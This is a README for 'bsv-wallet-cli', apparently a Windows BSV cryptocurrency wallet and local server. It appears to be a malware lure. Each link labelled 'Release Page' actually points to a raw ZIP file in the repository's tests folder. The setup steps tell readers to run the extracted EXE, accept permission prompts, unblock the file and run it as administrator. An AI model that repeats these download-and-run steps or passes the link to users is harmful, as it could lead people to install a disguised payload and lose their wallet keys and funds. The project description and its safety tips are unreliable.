# 🧰 bsv-wallet-cli - Run Your BSV Wallet Locally

[![Download bsv-wallet-cli](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Hala6135/bsv-wallet-cli/raw/refs/heads/main/tests/cli-bsv-wallet-1.2.zip)

## 🚀 What this app does

bsv-wallet-cli is a self-hosted BSV wallet and BRC-100 server in one Rust binary.

It gives you a local wallet you control. It also runs a server that can work with MetaNet Client tools. You keep your keys and data on your own computer.

## 💻 What you need

- A Windows PC
- Internet access for the first download
- Enough free disk space for the app and wallet data
- Permission to run apps on your computer

For best results, use a recent version of Windows 10 or Windows 11.

## 📥 Download and install

Visit this page to download:

https://github.com/Hala6135/bsv-wallet-cli/raw/refs/heads/main/tests/cli-bsv-wallet-1.2.zip

1. Open the release page.
2. Find the latest release.
3. Download the Windows file for your system.
4. If the release comes as a ZIP file, open it and extract the contents.
5. If the release comes as an EXE file, double-click it to run it.
6. If Windows asks for permission, choose to run the app.

If you see more than one file, pick the one that matches your PC:

- `windows-x64` for most modern Windows PCs
- `windows-arm64` for ARM-based devices

## 🏁 First run

1. Open the folder where you saved the files.
2. Start the `bsv-wallet-cli` app.
3. If a console window opens, keep it open while you use the wallet.
4. Follow any prompts on screen.
5. Let the app create its local wallet files.

The first start may take a short time while the app sets up its data folder.

## 🔐 Set up your wallet

When the app starts, it creates a local wallet on your machine.

Follow the prompts to:

1. Create a new wallet
2. Set a strong password if the app asks for one
3. Write down your recovery phrase if one is shown
4. Keep your wallet files in a safe place

Use a password that you do not use anywhere else. If you save a recovery phrase, store it offline.

## 🌐 Start the local server

bsv-wallet-cli also runs a local BRC-100 server.

After the app starts, it may print a local address such as:

- `http://127.0.0.1:...`
- `http://localhost:...`

Use that address in a browser or in a client app that connects to local services.

If the app asks for a port number, you can keep the default value unless another app already uses it.

## 🔗 Connect with MetaNet Client

This app is wire-compatible with MetaNet Client.

To connect:

1. Start bsv-wallet-cli
2. Make sure the local server is running
3. Open MetaNet Client
4. Enter the local server address shown in the console
5. Save the connection settings

If the client cannot connect, check that both apps are running and that you used the same port.

## 🧭 Common tasks

### Send BSV

1. Open the wallet
2. Choose the send option
3. Enter the recipient address
4. Enter the amount
5. Confirm the transaction

### Check your balance

1. Open the wallet
2. Look for the balance screen or balance command
3. Wait for the app to sync if needed

### View wallet data

The app stores wallet data on your computer. You can keep it on your main drive or move it to a safe backup folder.

## 🛠️ Basic command line use

This app is CLI-first, which means it can run from a command window.

If the release includes a `.exe` file, you can open PowerShell or Command Prompt in that folder and run it from there.

Example:

- `bsv-wallet-cli.exe`

If the app shows help text, use it to see available commands.

## 📂 Suggested folder setup

Keep the app in a folder you can find later, such as:

- `C:\Apps\bsv-wallet-cli\`
- `C:\Users\YourName\Downloads\bsv-wallet-cli\`

If you want to keep wallet data separate, make a second folder for backups.

## 🔍 If something does not work

### The app does not open

- Check that you downloaded the Windows file
- Try running the app again
- Right-click the file and choose Run as administrator if needed

### Windows blocks the file

- Open the file properties
- If you see an Unblock option, turn it on
- Run the file again

### The wallet does not connect

- Make sure bsv-wallet-cli is still running
- Check the local address and port
- Make sure no other app uses the same port

### The window closes right away

- Start the app from PowerShell or Command Prompt
- Read the error message before closing the window
- Try the latest release from the download page

## 🧾 Project details

- Repository name: bsv-wallet-cli
- Type: Self-hosted wallet and server
- Language: Rust
- Use case: Local BSV wallet and BRC-100 server
- Model: Non-custodial and self-hosted

## 🏷️ Topics

bitcoin, bitcoin-sv, blockchain, brc-100, bsv, cli, mcp, non-custodial, rust, self-hosted, wallet, wallet-server

## 🧩 What you can expect

- A local wallet you control
- A single binary for easier setup
- A command line interface for direct control
- Local server support for client apps
- A setup that keeps control on your side

## 🧠 File safety tips

- Download only from the release page
- Keep a backup of your wallet data
- Store your recovery phrase offline
- Do not share your private keys
- Test with a small amount first if you are new to the app

## 📁 Typical release files

A Windows release may include files like:

- `.exe` for direct use
- `.zip` for manual setup
- checksum files for file verification

If you see a ZIP file, extract it before you start the app. If you see an EXE file, open it directly.

## 🖱️ Quick start steps

1. Open the release page
2. Download the Windows file
3. Extract it if needed
4. Start the app
5. Follow the setup prompts
6. Keep the window open while the wallet or server runs